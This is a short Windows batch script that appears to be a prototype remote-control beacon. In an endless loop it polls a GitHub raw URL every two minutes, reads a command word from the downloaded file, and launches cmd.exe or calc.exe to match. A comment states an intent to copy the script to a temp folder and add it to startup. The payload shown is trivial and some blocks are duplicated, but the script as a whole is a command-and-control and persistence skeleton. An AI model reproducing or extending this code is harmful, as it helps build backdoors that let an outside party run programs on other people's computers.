@echo off
:x

    :: clone to temp folder and add to startup


    curl https://raw.githubusercontent.com/Sap196/DownloadableFiles/main/command.txt -o command.txt
    for /f "delims=" %%a in ('type "command.txt"') do set "build=%%a"

    if "%build%"=="cmd" (
        cmd.exe
    )
    if "%build%"=="calc" (
        calc.exe
    )
    if "%build%"=="cmd" (
        echo it is %build%
    )
    if "%build%"=="cmd" (
        echo it is %build%
    )

    timeout /t 120 /nobreak > NUL
goto x